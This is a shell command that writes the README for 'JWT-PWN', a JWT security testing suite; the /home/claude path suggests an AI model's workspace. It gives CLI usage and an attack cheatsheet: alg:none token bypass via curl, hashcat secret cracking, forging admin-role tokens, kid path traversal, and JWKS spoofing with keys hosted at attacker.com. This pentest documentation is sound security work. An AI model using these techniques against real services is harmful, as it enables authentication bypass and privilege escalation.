cat > /home/claude/jwt-auth-toolkit/README.md << 'EOF'
# 🔐 JWT-PWN — Auth Header Analyzer + JWT Attack Suite

> A comprehensive, browser-native JWT security testing toolkit with integrations for Burp Suite, Caido, and a standalone Python CLI.

---

## Features

| Attack | Description |
|--------|-------------|
| **None Algorithm** | Bypass signature validation using `alg:none` (6 casing variants) |
| **HMAC Brute Force** | Crack HS256/384/512 tokens against common weak secrets |
| **Privilege Escalation** | Forge tokens with admin/role claims |
| **KID Injection** | Path traversal, SQL injection, SSRF via `kid` header |
| **JKU/X5U Detection** | Detect JWKS URL spoofing vectors |
| **Auth Header Analysis** | Detect JWT, Basic, Digest, API Keys, auth cookies |
| **Token Forge** | Rebuild + re-sign tokens with modified claims |

---

## Tools Included

### 🌐 Web UI (`web-ui/index.html`)
Open directly in any browser — no server, no installation, fully offline.

```bash
open web-ui/index.html
# or
python3 -m http.server 8080 --directory web-ui
```

### 🐍 Python CLI (`python-cli/jwt_pwn.py`)
No dependencies beyond Python 3.6+.

```bash
# Analyze a JWT
python jwt_pwn.py analyze -t "eyJhbGciOiJIUzI1NiJ9..."

# Run all attacks
python jwt_pwn.py attack -t "eyJhbGc..." -w /usr/share/wordlists/rockyou.txt

# Probe a live URL with forged tokens
python jwt_pwn.py attack -t "eyJhbGc..." -u https://api.target.com/me

# Analyze raw HTTP headers
python jwt_pwn.py headers -H "Authorization: Bearer eyJ..."
cat request.txt | python jwt_pwn.py headers

# Forge a token with known secret
python jwt_pwn.py forge -t "eyJhbGc..." -s "secret" --set role=admin --set is_admin=true
```

### 🔴 Burp Suite Extension (`burp-extension/jwt_pwn_burp.py`)
**Requirements:** Jython 2.7 standalone JAR

1. Download Jython: https://www.jython.org/download.html
2. Burp → **Extender → Options → Python Environment** → set Jython JAR path
3. **Extender → Extensions → Add → Type: Python** → select `jwt_pwn_burp.py`
4. Right-click any request → **Send to JWT-PWN**
5. Use the **JWT-PWN** tab for analysis, attacks, and token forging

### 🟣 Caido Plugin (`caido-plugin/`)
**Requirements:** Caido 0.39+

1. Caido → **Plugins → Load unpacked** → select `caido-plugin/` directory
2. Right-click any request → **Analyze with JWT-PWN**
3. View findings in the **Findings** tab
4. Use the **JWT-PWN** sidebar for manual analysis

---

## Attack Cheatsheet

### None Algorithm Bypass
```bash
# A JWT with alg:none and empty signature is accepted by some libraries
curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ." \
  https://api.target.com/admin
```

### Weak Secret Cracking
```bash
# With hashcat
hashcat -a 0 -m 16500 token.txt rockyou.txt

# With jwt-pwn (built-in wordlist)
python jwt_pwn.py attack -t "eyJ..." 

# With custom wordlist
python jwt_pwn.py attack -t "eyJ..." -w /usr/share/wordlists/rockyou.txt
```

### KID Path Traversal
The `kid` header tells the server which key to use. If it maps to a file path:
```
kid: ../../dev/null → server reads empty file → sign with empty string
```

### JWKS URL Spoofing
If `jku` header is present and the server fetches it without allowlisting:
1. Generate RSA keypair: `openssl genrsa -out priv.pem 2048`
2. Host JWKS at attacker.com with your public key
3. Forge token with `jku: https://attacker.com/jwks.json`
4. Sign with your private key

---

## Legal

This tool is for authorized security testing only. Never use against systems you don't own or have explicit permission to test.

---

## License: MIT
EOF
